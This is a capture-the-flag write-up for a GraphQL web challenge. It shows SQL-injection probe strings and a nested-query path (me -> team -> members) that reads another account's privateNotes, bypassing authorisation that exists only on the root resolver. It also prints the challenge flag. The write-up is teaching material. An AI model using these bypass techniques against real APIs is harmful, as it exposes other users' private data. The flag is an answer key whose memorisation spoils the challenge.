# shape-of-query - WEB (300 pts)

**Flag:** `POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}` · **Target:** `https://shape-of-query.pointeroverflowctf.com`

## Challenge

The author built a "Collaborative Research Portal" himself and invited testers to poke at it. What he worries about most is **user security**, because of "researchers meddling with each others' stuff". The portal sits on its own subdomain, you log in with the team's session token (the challenge page issues a fresh token on each reload, valid 15 minutes), and once inside you work with a **GraphQL API at `/graphql`, introspection enabled**.

## Initial Analysis

The login page has only a single token field; `POST /session/exchange` with a valid token returns `{"ok":true,"team_id":612}` and sets the `session` cookie. Going to `/graphql` gives GraphiQL.

Introspection returns exactly four economical types:

```graphql
type Query { me: User   user(id: ID!): User }
type User  { id: ID!  username: String!  role: UserRoleEnum  team: Team  privateNotes: String }
type Team  { id: ID!  name: String  members: [User] }
enum UserRoleEnum { ADMIN MEMBER }
```

The field descriptions on the server, written by the author himself, already point straight at the suspect: `user` is "You may only view yourself", `privateNotes` is "Visible to the account owner only", `members` is "Cross-team enumeration is blocked". So the target is the `privateNotes` of an account other than your own.

`me` returns `researcher_612` with `privateNotes` "Grocery list, personal reminders. Nothing worth reading." - bait.

## Directions ruled out

The full log is in `notes.md`.

1. **IDOR on `user(id:)`**: `user(id:"user_1")`, `user(id:"612")`, `user(id:"1")` all return `null`, no error. Ruled out.
2. **SQLi in the `id` parameter** (the challenge name hints at "query"): `user_1' OR '1'='1`, `user_612' OR '1'='1`, `user_612'--`, `user_612 ` - every payload still returns `null` and the result shape is unchanged, meaning the resolver uses a parameterised query. Ruled out.
3. **A hidden field at the `Query` root**: probing 46 commonly used names (`flag`, `secret`, `notes`, `token`, `debug`, `sql`, `exec`, `members`, ...) -> all 46 report `Cannot query field`. `Query` has only `me` and `user`. Ruled out.
4. **Alias confusion / field order**: `{ one: user(id:"user_1"){...} six: user(id:"user_612"){...} }` and the reversed variant - each field is still resolved independently. Ruled out.
5. **Query batching**: sending the body as an array of requests makes the server return **HTTP 500** (the Flask error page), no data. That is an implementation bug, not a way around the authorisation check. Ruled out (not exploited further).

## Exploit Chain

**Step 1 - Draw the graph of paths to the target field.** `privateNotes` does not only hang off `Query.user`; there is another route: `Query.me -> User.team -> Team.members -> privateNotes`. The "you may only view yourself" description is attached only to `Query.user`.

**Step 2 - Follow the nested route.**

```graphql
{ me { team { members { id username role privateNotes } } } }
```

```json
{"data":{"me":{"team":{"members":[
  {"id":"user_612","privateNotes":"Grocery list, personal reminders. Nothing worth reading.","role":"MEMBER","username":"researcher_612"},
  {"id":"admin_612","privateNotes":"POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}","role":"ADMIN","username":"admin_612"}
]}}}}
```

`Team.members` returns each member together with its **raw** `privateNotes`, passing no authorisation check at all. Every team has an `admin_<team_id>` account, and the flag is in the private notes of your own team's admin.

**Step 3 - Verify it is not another team's data.** `user(id:"admin_612")` still returns `null`, even though that admin is on the same team - which shows the authorisation check exists only in the `Query.user` resolver, and not in `Team.members`. Furthermore, the nonce `EB7ZOZUZT7FJHWR2` in the flag is exactly the nonce in the challenge page's session token, so this is team 612's flag.

**Step 4 - Submit.**

```
POST /challenges/shape-of-query/submit
{"flag":"POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}"}
{"correct":true,"message":"Correct."}
```

## Flag

```
POCTF{81.612.EB7ZOZUZT7FJHWR2.YQXWHGRFYSBYU46VGKVYD22DNN}
```

The decisive idea: in GraphQL, authorisation is usually implemented in **the resolver of a root field**, so the very same data field can be fully exposed when reached through **another path** in the type graph. Do not check "does the endpoint block this", enumerate every path to the target field.

## Reproduce

```bash
python exploit.py "<session token trên trang challenge>"
```
